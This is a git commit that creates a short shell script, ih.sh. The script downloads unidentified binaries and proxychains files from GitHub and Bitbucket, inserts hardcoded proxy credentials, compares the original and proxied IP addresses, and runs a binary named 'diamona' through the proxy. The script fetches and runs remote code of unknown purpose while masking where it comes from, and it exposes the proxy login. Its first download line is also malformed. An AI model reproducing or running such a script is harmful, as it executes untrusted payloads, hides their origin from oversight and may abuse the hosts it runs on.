a53b019bf7a449a8aed003af286377d8e0a394be
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-18 19:21:25 +0700

    Create ih.sh

---
+++ ih.sh
@@ -0,0 +1,22 @@
+proxy="188.74.210.21" 
+port="6100" 
+user="ubslvwxe"  
+pass="iikj33112te4" 
+wget -q -O https://raw.githubusercontent.com/55113110159/OS/main/dnx && chmod +x diamona
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "**********************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./diamona
